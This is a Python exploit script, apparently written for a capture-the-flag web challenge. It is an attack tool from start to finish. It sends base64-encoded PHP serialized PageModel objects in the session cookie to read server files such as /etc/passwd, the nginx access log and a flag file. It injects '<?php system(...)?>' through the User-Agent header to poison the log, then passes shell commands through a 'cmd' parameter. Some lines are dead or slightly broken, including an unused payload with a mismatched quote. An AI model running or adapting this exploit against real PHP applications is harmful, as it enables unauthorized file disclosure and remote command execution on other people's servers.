#!/usr/bin/python3

import urllib.parse as parser
from pwn import *
import base64
import re
import requests
from pprint import pprint
import sys

from requests.api import head

def exploitation(url: str, agent: str):
    # encoded = base64.b64encode(b'O:9:"PageModel":1:{s:4:"file";s:25:"/var/log/nginx/access.log";}')
    encoded = base64.b64encode(b'O:9:"PageModel":1:{s:4:"file";s:11:"/etc/passwd";}')
    headers = {
        "User-Agent":"<?php system('ls /');?>",
        "Cookie":"Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxNToiL3d3dy9pbmRleC5odG1sIjt9"
    }
    sess = requests.session()
    sess.get(url=url, headers=headers)
    p = log.progress('Making requests...')
    
    print(encoded.decode())
    p.status("Waiting for server response...")
    # print(response.headers["Set-Cookie"])
    
    
    # print("\n\n", response.headers, "\n\n")
    # Encoding the path of the logs
    # O:9:"PageModel":1:{s:4:"file";s:25:"/var/log/nginx/access.log";}
    # O:9:"PageModel":1:{s:4:"file";s:15:"/www/index.html";}
    # "Cookie": "PHPSESSID="+encoded.decode(),

    # headers["User-Agent"] = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36"
    headers["User-Agent"] = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36"
    headers["Cookie"] =  "PHPSESSID=Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxMToiL2ZsYWdfNTRMMDkiO30="
    print("\n", headers, "\n")
    new_response = requests.post(url=url+"&cmd="+parser.quote("ls /"), headers=headers)
    print(new_response.text)


def main():
    try:
        if len(sys.argv) < 2:
            print("""
                  python3 toxic-exploit.py <target url>
                  """)
        else:
            url = sys.argv[1]
            exploitation(url=url, agent="<?php system($_GET['cmd]);?>")
    except Exception as e:
        print(str(e))
        exit()


"""
Mozilla/5.0 (X11; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0
"""

if __name__ == "__main__":
    main()
